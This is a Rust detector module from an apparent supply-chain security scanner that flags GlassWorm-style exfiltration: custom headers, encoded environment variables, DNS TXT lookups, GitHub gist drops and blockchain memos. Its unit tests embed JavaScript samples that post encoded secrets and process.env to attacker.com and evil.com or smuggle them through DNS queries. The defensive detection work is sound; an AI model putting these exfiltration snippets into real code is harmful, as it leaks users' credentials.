//! Exfiltration Detector (GlassWorm-specific)
//!
//! Detects GlassWorm-specific data exfiltration patterns including
//! custom HTTP headers, DNS queries, and blockchain-based exfil.
//!
//! ## Detection Logic
//!
//! This detector emits findings when:
//! 1. Custom HTTP headers (X-Exfil-ID, X-Session-Token)
//! 2. Base64-encoded env vars in HTTP requests
//! 3. DNS TXT record queries (resolveTxt)
//! 4. GitHub API for exfil (gists, issues)
//! 5. Blockchain transfer with memo
//!
//! ## GlassWorm Exfiltration Methods
//!
//! GlassWorm employs multiple exfiltration channels:
//! 1. HTTP Headers: Custom headers hide stolen data in requests
//! 2. DNS TXT: Queries encode data in DNS lookups
//! 3. GitHub API: Gists and issues as data drop points
//! 4. Blockchain: Transaction memos hide exfiltrated data
//!
//! ## Severity
//!
//! Critical: Custom exfil headers (X-Exfil-ID, X-Session-Token)
//! Critical: Base64-encoded env vars in HTTP requests
//! High: DNS TXT record queries
//! High: GitHub API usage for potential exfil
//! High: Blockchain transfer with memo

use crate::detector::{Detector, DetectorMetadata, DetectorTier};
use crate::finding::{DetectionCategory, Finding, Severity};
use crate::ir::FileIR;
use once_cell::sync::Lazy;
use regex::Regex;
use std::path::Path;

/// Custom HTTP headers used for exfiltration
const EXFIL_HEADERS: &[&str] = &[
    "X-Exfil-ID",
    "X-Session-Token",
    "X-Data-Payload",
    "X-Env-Vars",
    "X-Exfiltrated-Data",
    "X-Stolen-Creds",
    "X-User-Data",
    "X-Credential-Data",
];

/// Patterns for exfiltration detection
static EXFIL_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
    vec![
        // Custom exfil headers
        Regex::new(r#"["']X-Exfil-ID["']|["']X-Session-Token["']|["']X-Data-Payload["']|["']X-Env-Vars["']"#).unwrap(),
        // Base64 encoding of env vars
        Regex::new(r"Buffer\.from\s*\(\s*process\.env|atob\s*\(\s*process\.env|btoa\s*\(\s*JSON\.stringify\s*\(\s*process\.env").unwrap(),
        // DNS TXT record queries
        Regex::new(r#"resolveTxt\s*\(|dns\.resolve\s*\([^,]+,\s*["']TXT["']|resolver\.resolveTxt"#).unwrap(),
        // GitHub API endpoints
        Regex::new(r"api\.github\.com.*(?:gists|issues)|github\.com/api.*(?:gists|issues)").unwrap(),
        // Blockchain transfer with memo
        Regex::new(r"Transfer.*Memo|Memo.*Transfer|transaction\.add.*memo|memo.*transaction\.add").unwrap(),
        // Fetch with custom headers
        Regex::new(r"fetch\s*\([^)]*\{[^}]*headers\s*:[^}]*X-").unwrap(),
        // HTTP POST with encoded data
        Regex::new(r#"POST.*Buffer\.from|fetch.*method\s*:\s*["']POST["'].*Buffer\.from"#).unwrap(),
        // WebSocket with custom headers
        Regex::new(r"new\s+WebSocket\s*\([^)]*headers").unwrap(),
    ]
});

/// Detector for GlassWorm data exfiltration
pub struct ExfiltrationDetector;

impl ExfiltrationDetector {
    /// Create a new exfiltration detector
    pub fn new() -> Self {
        Self
    }
}

impl Default for ExfiltrationDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl Detector for ExfiltrationDetector {
    fn name(&self) -> &str {
        "exfiltration"
    }

    fn tier(&self) -> DetectorTier {
        DetectorTier::Tier3Behavioral
    }

    fn cost(&self) -> u8 {
        4  // Medium cost - multiple pattern matching
    }

    fn signal_strength(&self) -> u8 {
        10  // Very high signal - exfil headers are definitive
    }

    fn prerequisites(&self) -> Vec<&'static str> {
        vec!["invisible_char", "glassware"]  // Run after Tier 1-2
    }

    fn should_run(&self, findings: &[Finding]) -> bool {
        // Don't run Tier 3 if nothing found by Tier 1-2
        !findings.is_empty()
    }

    fn detect(&self, ir: &FileIR) -> Vec<Finding> {
        let mut findings = Vec::new();
        let content = ir.content();
        let path = &ir.metadata.path;

        for (line_num, line) in content.lines().enumerate() {
            let line_trimmed = line.trim();

            // Pattern 1: Custom exfil headers (CRITICAL)
            for header in EXFIL_HEADERS {
                if line_trimmed.contains(header) {
                    findings.push(
                        Finding::new(
                            path,
                            line_num + 1,
                            1,
                            0,
                            '\0',
                            DetectionCategory::HeaderC2,
                            Severity::Critical,
                            &format!("Exfiltration header detected: {}", header),
                            "CRITICAL: Custom HTTP header used for data exfiltration. \
                             This header is designed to smuggle stolen data past security monitoring. \
                             Immediate incident response required.",
                        )
                        .with_cwe_id("CWE-359")
                        .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                        .with_confidence(0.95)
                        .with_context(line_trimmed),
                    );
                }
            }

            // Pattern 2: Base64-encoded env vars in HTTP requests (CRITICAL)
            if EXFIL_PATTERNS[1].is_match(line) {
                findings.push(
                    Finding::new(
                        path,
                        line_num + 1,
                        1,
                        0,
                        '\0',
                        DetectionCategory::HeaderC2,
                        Severity::Critical,
                        "Environment variables encoded and sent via HTTP",
                        "CRITICAL: Code is encoding environment variables (likely containing secrets) \
                         and sending them over HTTP. This is active credential exfiltration.",
                    )
                    .with_cwe_id("CWE-359")
                    .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                    .with_confidence(0.92)
                    .with_context(line_trimmed),
                );
            }

            // Pattern 3: DNS TXT record queries (HIGH)
            if EXFIL_PATTERNS[2].is_match(line) {
                findings.push(
                    Finding::new(
                        path,
                        line_num + 1,
                        1,
                        0,
                        '\0',
                        DetectionCategory::HeaderC2,
                        Severity::High,
                        "DNS TXT record queries (potential exfil)",
                        "DNS TXT record queries can exfiltrate data by encoding it in DNS lookups. \
                         This bypasses traditional HTTP monitoring. Review the query content.",
                    )
                    .with_cwe_id("CWE-359")
                    .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                    .with_confidence(0.78)
                    .with_context(line_trimmed),
                );
            }

            // Pattern 4: GitHub API for exfil (HIGH)
            if EXFIL_PATTERNS[3].is_match(line) {
                findings.push(
                    Finding::new(
                        path,
                        line_num + 1,
                        1,
                        0,
                        '\0',
                        DetectionCategory::HeaderC2,
                        Severity::High,
                        "GitHub API usage for potential data exfil",
                        "GitHub Gists and Issues can be used as data drop points for exfiltrated data. \
                         Review the API calls for data upload patterns.",
                    )
                    .with_cwe_id("CWE-359")
                    .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                    .with_confidence(0.72)
                    .with_context(line_trimmed),
                );
            }

            // Pattern 5: Blockchain transfer with memo (HIGH)
            if EXFIL_PATTERNS[4].is_match(line) {
                findings.push(
                    Finding::new(
                        path,
                        line_num + 1,
                        1,
                        0,
                        '\0',
                        DetectionCategory::BlockchainC2,
                        Severity::High,
                        "Blockchain transfer with memo (data hiding)",
                        "Blockchain transactions with memo instructions can hide exfiltrated data. \
                         The memo field is publicly visible but can encode stolen data.",
                    )
                    .with_cwe_id("CWE-359")
                    .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                    .with_confidence(0.80)
                    .with_context(line_trimmed),
                );
            }

            // Pattern 6: Fetch with custom headers (HIGH)
            if EXFIL_PATTERNS[5].is_match(line) {
                // Check if it's an exfil header
                let has_exfil_header = EXFIL_HEADERS.iter().any(|h| line.contains(h));

                if !has_exfil_header {
                    // Generic custom header - lower severity
                    findings.push(
                        Finding::new(
                            path,
                            line_num + 1,
                            1,
                            0,
                            '\0',
                            DetectionCategory::HeaderC2,
                            Severity::Medium,
                            "HTTP request with custom headers",
                            "Custom HTTP headers can be used for data exfiltration or C2 communication. \
                             Review the header names and values for suspicious patterns.",
                        )
                        .with_cwe_id("CWE-359")
                        .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                        .with_confidence(0.55)
                        .with_context(line_trimmed),
                    );
                }
            }

            // Pattern 7: HTTP POST with encoded data (HIGH)
            if EXFIL_PATTERNS[6].is_match(line) {
                findings.push(
                    Finding::new(
                        path,
                        line_num + 1,
                        1,
                        0,
                        '\0',
                        DetectionCategory::HeaderC2,
                        Severity::High,
                        "HTTP POST with encoded data (potential exfil)",
                        "HTTP POST requests with encoded data can exfiltrate stolen credentials or sensitive data. \
                         Review the POST payload for encoded secrets.",
                    )
                    .with_cwe_id("CWE-359")
                    .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                    .with_confidence(0.75)
                    .with_context(line_trimmed),
                );
            }
        }

        // Additional check: Look for fetch/axios with multiple exfil indicators
        self.detect_exfil_correlation(content, path, &mut findings);

        findings
    }

    fn metadata(&self) -> DetectorMetadata {
        DetectorMetadata {
            name: "exfiltration".to_string(),
            version: "1.0.0".to_string(),
            description: "Detects GlassWorm data exfiltration patterns including custom headers, DNS queries, and blockchain exfil".to_string(),
        }
    }
}

impl ExfiltrationDetector {
    /// Detect correlated exfiltration patterns
    fn detect_exfil_correlation(&self, content: &str, path: &str, findings: &mut Vec<Finding>) {
        // Check for fetch/axios + env access + encoding combination
        let has_fetch_or_axios = content.contains("fetch(") || content.contains("axios.") || content.contains("http.post") || content.contains("http.get");
        let has_env_access = content.contains("process.env") || content.contains("process.env");
        let has_encoding = content.contains("Buffer.from") || content.contains("btoa") || content.contains("encodeURIComponent");
        let has_network = content.contains("http://") || content.contains("https://") || content.contains(".post(") || content.contains(".get(");

        if has_fetch_or_axios && has_env_access && has_encoding && has_network {
            // Find first relevant line
            let first_line = content
                .lines()
                .position(|l| l.contains("fetch") || l.contains("axios") || l.contains("process.env"))
                .unwrap_or(0)
                + 1;

            // Only add if not already flagged by specific patterns
            let already_flagged = findings.iter().any(|f| {
                f.severity == Severity::Critical && f.category == DetectionCategory::HeaderC2
            });

            if !already_flagged {
                findings.push(
                    Finding::new(
                        path,
                        first_line,
                        1,
                        0,
                        '\0',
                        DetectionCategory::HeaderC2,
                        Severity::High,
                        "Network request with encoded environment variables",
                        "Combination of network requests, environment variable access, and encoding \
                         suggests data exfiltration. Review the code for credential theft.",
                    )
                    .with_cwe_id("CWE-359")
                    .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode")
                    .with_confidence(0.82),
                );
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::UnicodeConfig;

    #[test]
    fn test_detect_exfil_header() {
        let detector = ExfiltrationDetector::new();

        let content = r#"
            fetch('https://attacker.com/ping', {
                method: 'POST',
                headers: {
                    'X-Exfil-ID': Buffer.from(envVars).toString('base64'),
                    'X-Session-Token': sessionToken,
                    'Content-Type': 'application/json',
                }
            });
        "#;

        let ir = FileIR::build(Path::new("exfil.js"), content);
        let findings = detector.detect(&ir);

        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.severity == Severity::Critical));
        assert!(findings.iter().any(|f| f.description.contains("X-Exfil-ID")));
        assert!(findings.iter().any(|f| f.confidence.unwrap_or(0.0) >= 0.90));
    }

    #[test]
    fn test_detect_encoded_env_vars() {
        let detector = ExfiltrationDetector::new();

        let content = r#"
            const data = Buffer.from(process.env.SECRET_KEY).toString('base64');
            fetch('https://evil.com/exfil', {
                method: 'POST',
                body: data
            });
        "#;

        let ir = FileIR::build(Path::new("exfil.js"), content);
        let findings = detector.detect(&ir);

        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.severity == Severity::Critical));
        assert!(findings.iter().any(|f| f.description.contains("Environment variables encoded")));
    }

    #[test]
    fn test_detect_dns_txt_query() {
        let detector = ExfiltrationDetector::new();

        let content = r#"
            const dns = require('dns').promises;
            
            async function exfil(data) {
                const encoded = Buffer.from(data).toString('base64');
                await dns.resolveTxt(`${encoded}.evil.com`);
            }
        "#;

        let ir = FileIR::build(Path::new("exfil.js"), content);
        let findings = detector.detect(&ir);

        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.description.contains("DNS TXT")));
        assert!(findings.iter().any(|f| f.severity == Severity::High));
    }

    #[test]
    fn test_detect_github_api() {
        let detector = ExfiltrationDetector::new();

        let content = r#"
            const response = await fetch('https://api.github.com/gists', {
                method: 'POST',
                headers: {
                    'Authorization': `token ${GITHUB_TOKEN}`,
                },
                body: JSON.stringify({
                    files: {
                        'data.txt': { content: stolenData }
                    }
                })
            });
        "#;

        let ir = FileIR::build(Path::new("exfil.js"), content);
        let findings = detector.detect(&ir);

        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.description.contains("GitHub API")));
    }

    #[test]
    fn test_detect_blockchain_memo() {
        let detector = ExfiltrationDetector::new();

        let content = r#"
            const transaction = new Transaction();
            transaction.add(SystemProgram.transfer({ fromPubkey, toPubkey, lamports }));
            // Add memo with exfiltrated data
            transaction.add(memoInstruction);
            await sendAndConfirmTransaction(connection, transaction, [payer]);
        "#;

        let ir = FileIR::build(Path::new("exfil.js"), content);
        let findings = detector.detect(&ir);

        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.description.contains("Blockchain transfer with memo")));
    }

    #[test]
    fn test_detect_correlation_pattern() {
        let detector = ExfiltrationDetector::new();

        let content = r#"
            const axios = require('axios');
            
            async function send() {
                const credentials = JSON.stringify(process.env);
                const encoded = Buffer.from(credentials).toString('base64');
                await axios.post('https://evil.com/collect', { data: encoded });
            }
        "#;

        let ir = FileIR::build(Path::new("exfil.js"), content);
        let findings = detector.detect(&ir);

        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.description.contains("Network request with encoded environment")));
    }

    #[test]
    fn test_no_detect_legitimate_fetch() {
        let detector = ExfiltrationDetector::new();

        // Legitimate fetch without exfil patterns
        let content = r#"
            fetch('https://api.example.com/data', {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                }
            })
            .then(response => response.json())
            .then(data => console.log(data));
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        // Should not have Critical findings
        assert!(!findings.iter().any(|f| f.severity == Severity::Critical));
    }

    #[test]
    fn test_no_detect_legitimate_dns() {
        let detector = ExfiltrationDetector::new();

        // Legitimate DNS lookup (not TXT)
        let content = r#"
            const dns = require('dns').promises;
            
            async function lookup() {
                const addresses = await dns.lookup('example.com');
                console.log(addresses);
            }
        "#;

        let ir = FileIR::build(Path::new("test.js"), content);
        let findings = detector.detect(&ir);

        // Should not have findings (no TXT query)
        assert!(findings.is_empty());
    }
}
